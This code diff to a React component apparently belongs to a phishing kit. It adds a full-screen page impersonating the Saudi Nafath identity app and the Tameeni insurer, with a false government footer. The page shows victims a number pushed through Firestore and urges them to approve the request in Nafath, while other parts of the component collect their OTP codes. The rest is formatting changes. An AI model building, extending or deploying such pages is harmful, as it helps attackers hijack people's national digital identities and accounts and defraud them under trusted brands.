@@ -113,7 +113,7 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true },
+            { merge: true }
           );
           setTimeout(() => inputRefs.current[0]?.focus(), 150);
         } else if (data.nafadConfirmationStatus === "rejected") {
@@ -126,11 +126,11 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true },
+            { merge: true }
           );
         }
       },
-      (error) => console.error("[nafad] Firestore listener error:", error),
+      (error) => console.error("[nafad] Firestore listener error:", error)
     );
     return () => unsubscribe();
   }, []);
@@ -159,7 +159,7 @@ export default function Component() {
 
   const handleOtpKeyDown = (
     index: number,
-    e: React.KeyboardEvent<HTMLInputElement>,
+    e: React.KeyboardEvent<HTMLInputElement>
   ) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
@@ -192,7 +192,7 @@ export default function Component() {
           nafadOtp: code,
           nafadOtpSubmittedAt: new Date().toISOString(),
         },
-        { merge: true },
+        { merge: true }
       );
       setOtpDone(true);
       setTimeout(() => {
@@ -239,79 +239,253 @@ export default function Component() {
         <Card className="border-0 shadow-xl shadow-teal-100/50 overflow-hidden">
           <div className="h-1 bg-gradient-to-r from-[#4db6ac] to-[#009688]" />
           <CardContent className="p-8 text-center space-y-6">
-            <p className="text-sm text-gray-500 leading-relaxed">
-              يرجى فتح تطبيق "نفاذ" واختيار رقم الطلب الموضّح أدناه لضمان إصدار
-              وثيقة التأمين بشكل فوري.
-            </p>
-            {showError ? (
-              <>
-                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
-                  <ShieldAlert className="w-8 h-8 text-red-500" />
-                </div>
-                <Alert
-                  className="text-sm text-red-700 bg-red-50 border-red-200 text-right"
-                  dir="rtl"
-                >
-                  <ShieldAlert className="w-4 h-4 text-red-600" />
-                  {showError}
-                </Alert>
-                <Button
-                  onClick={handleRetry}
-                  className="w-full bg-[#009688] hover:bg-[#00796b] text-white h-12 text-base font-semibold rounded-xl shadow-md"
-                >
-                  إعادة المحاولة
-                </Button>
-              </>
-            ) : confirmationCode ? (
-              <>
-                <div className="mx-auto w-44 h-44 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-200 rounded-3xl shadow-inner flex items-center justify-center">
-                  <div
-                    className="flex gap-4 justify-center items-center"
-                    dir="ltr"
-                  >
-                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
-                      {confirmationCode?.[0] || "–"}
-                    </div>
-                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
-                      {confirmationCode?.[1] || "–"}
-                    </div>
+            {" "}
+            <div
+              className="fixed inset-0 z-50 bg-white flex flex-col"
+              dir="rtl"
+            >
+              {/* Header */}
+              {/* Logo / Header */}
+              <div className="flex items-center gap-3 mb-10 mt-4">
+                <div className="text-right">
+                  <div className="w-12 h-12 flex items-center justify-center">
+                    <img src="/tameeni-logo.webp" width={80} />
                   </div>
+                  <p className="text-gray-800 font-semibold text-base">
+                    تأميني
+                  </p>
                 </div>
-                <div className="flex items-center justify-center gap-2 text-[#009688]">
-                  <div className="relative flex items-center justify-center w-4 h-4">
-                    <div className="w-3 h-3 bg-[#009688] rounded-full animate-ping absolute opacity-75" />
-                    <div className="w-2 h-2 bg-[#00796b] rounded-full" />
-                  </div>
-                  <span className="text-sm font-medium">
-                    في انتظار تأكيدك في التطبيق...
-                  </span>
-                </div>
-              </>
-            ) : (
-              <>
-                <div className="flex flex-col items-center gap-4">
-                  <div className="relative">
-                    <div className="w-16 h-16 bg-teal-50 rounded-full flex items-center justify-center">
-                      <Loader2Icon className="w-8 h-8 text-[#009688] animate-spin" />
-                    </div>
-                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-[#009688] rounded-full flex items-center justify-center">
-                      <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
-                    </div>
-                  </div>
-                </div>
+                {/* Logo Icon */}
+              </div>
 
-                <div className="bg-teal-50 rounded-xl p-4 border border-teal-100 space-y-2 text-right">
-                  <div className="flex items-center gap-2 text-[#00796b] text-sm">
-                    <ShieldCheck className="w-4 h-4 flex-shrink-0" />
-                    <span>تأكد أن تطبيق نفاذ مثبت على جهازك</span>
+              <div className="flex-1 flex flex-col items-center px-6 py-4">
+                {/* Nafath title */}
+                <img src="/images (2).png" width={100} />
+                <h2 className="text-xl font-bold text-gray-800 mb-3 text-center">
+                  التحقق من خلال تطبيق نفاذ
+                </h2>
+
+                <p className="text-gray-600 text-sm text-center leading-relaxed mb-8 max-w-xs">
+                  الرجاء فتح تطبيق نفاذ وتأكيد طلب إصدار أمر ربط شريحتك على رقم
+                  الجوال لتأكيد حجز الموعد باختيار الرقم أدناه
+                </p>
+
+                {/* Two step cards */}
+                <div className="flex gap-4 w-full mb-8">
+                  {/* Step 2 - face scan */}
+                  <div className="flex-1 flex flex-col items-center gap-2">
+                    <div className="w-full aspect-square rounded-xl border-2 border-[#2a7a4b] flex items-center justify-center bg-white overflow-hidden p-3">
+                      {/* Face biometric illustration */}
+                      <svg
+                        viewBox="0 0 100 100"
+                        width="100%"
+                        height="100%"
+                        xmlns="http://www.w3.org/2000/svg"
+                      >
+                        {/* Face scan grid */}
+                        <rect
+                          x="5"
+                          y="5"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="5"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="75"
+                          y="5"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="91"
+                          y="5"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="91"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="75"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="75"
+                          y="91"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="91"
+                          y="75"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        {/* Person silhouette */}
+                        <circle cx="50" cy="35" r="18" fill="#f0a080" />
+                        <ellipse
+                          cx="50"
+                          cy="80"
+                          rx="22"
+                          ry="18"
+                          fill="#4fc3f7"
+                        />
+                        {/* Face dots */}
+                        <circle
+                          cx="44"
+                          cy="33"
+                          r="2"
+                          fill="#555"
+                          opacity="0.7"
+                        />
+                        <circle
+                          cx="56"
+                          cy="33"
+                          r="2"
+                          fill="#555"
+                          opacity="0.7"
+                        />
+                        <path
+                          d="M44 43 Q50 48 56 43"
+                          stroke="#555"
+                          strokeWidth="1.5"
+                          fill="none"
+                          strokeLinecap="round"
+                          opacity="0.7"
+                        />
+                        {/* Scan lines */}
+                        <line
+                          x1="20"
+                          y1="50"
+                          x2="80"
+                          y2="50"
+                          stroke="#2a7a4b"
+                          strokeWidth="1"
+                          opacity="0.3"
+                          strokeDasharray="4,3"
+                        />
+                        <line
+                          x1="20"
+                          y1="55"
+                          x2="80"
+                          y2="55"
+                          stroke="#2a7a4b"
+                          strokeWidth="1"
+                          opacity="0.2"
+                          strokeDasharray="4,3"
+                        />
+                      </svg>
+                    </div>
+                    <p className="text-xs text-gray-700 font-bold text-center">
+                      ثانياً: اختيار الرقم
+                    </p>
+                    <p className="text-xs text-gray-600 text-center">
+                      ادناه و التحقق عبر السمات الحيوية
+                    </p>
                   </div>
-                  <div className="flex items-center gap-2 text-[#00796b] text-sm">
-                    <Smartphone className="w-4 h-4 flex-shrink-0" />
-                    <span>انتظر وصول الإشعار على هاتفك</span>
+
+                  {/* Step 1 - Nafath app */}
+                  <div className="flex-1 flex flex-col items-center gap-2">
+                    <img src="/unnamed.png" />
+                    <p className="text-xs text-gray-700 font-bold text-center">
+                      أولاً: يرجى تحميل
+                    </p>
+                    <p className="text-xs text-gray-600 text-center">
+                      تطبيق نفاذ
+                    </p>
                   </div>
                 </div>
-              </>
-            )}
+                {confirmationCode.length < 1 ? (
+                  <>
+                    {" "}
+                    {/* Spinner */}
+                    <div className="mb-4">
+                      <div
+                        className="w-14 h-14 rounded-full border-4 border-gray-200 border-t-[#2a7a4b]"
+                        style={{ animation: "spin 1s linear infinite" }}
+                      />
+                      <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
+                    </div>
+                    <p className="text-gray-500 text-sm mb-8">
+                      يرجى الإنتظار ... سيظهر الكود أمامك خلال لحظات.
+                    </p>
+                  </>
+                ) : (
+                  confirmationCode
+                )}
+                {/* Open Nafath button */}
+                <a
+                  href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
+                  className="w-full py-4 rounded-lg text-white text-lg font-bold transition-colors"
+                  style={{ background: "#2a7a4b" }}
+                >
+                  افتح تطبيق نفاذ
+                </a>
+              </div>
+              {/* Footer text */}
+              <div className="px-5 pb-6 text-center">
+                <p className="text-gray-400 text-xs">
+                  إصدار وإتاحة الهوية الوطنية الرقمية عبر
+                </p>
+                <p className="text-gray-400 text-xs">
+                  تطوير وتشغيل مركز المعلومات الوطني
+                </p>
+              </div>
+
+              {/* Floating Chat Button */}
+              <div className="fixed bottom-8 left-6 z-50">
+                <button className="w-14 h-14 rounded-full bg-green-500 hover:bg-green-600 flex items-center justify-center shadow-lg transition-colors">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    className="w-7 h-7 text-white"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                    stroke="currentColor"
+                    strokeWidth={2}
+                  >
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
+                    />
+                  </svg>
+                </button>
+              </div>
+            </div>
           </CardContent>
         </Card>
 
@@ -400,10 +574,10 @@ export default function Component() {
                     otpError
                       ? "border-red-300 bg-red-50 text-red-700"
                       : otpDone
-                        ? "border-emerald-300 bg-emerald-50 text-emerald-700"
-                        : digit
-                          ? "border-[#009688] bg-teal-50 text-[#00796b]"
-                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
+                      ? "border-emerald-300 bg-emerald-50 text-emerald-700"
+                      : digit
+                      ? "border-[#009688] bg-teal-50 text-[#00796b]"
+                      : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white",
                   ].join(" ")}
                 />
               ))}
@@ -433,8 +607,8 @@ export default function Component() {
                 background: otpDone
                   ? "linear-gradient(135deg, #10b981, #059669)"
                   : otpLoading
-                    ? "linear-gradient(135deg, #00796b, #00695c)"
-                    : "linear-gradient(135deg, #009688, #00796b)",
+                  ? "linear-gradient(135deg, #00796b, #00695c)"
+                  : "linear-gradient(135deg, #009688, #00796b)",
                 color: "#fff",
                 boxShadow: otpDone
                   ? "0 8px 24px rgba(16,185,129,0.3)"
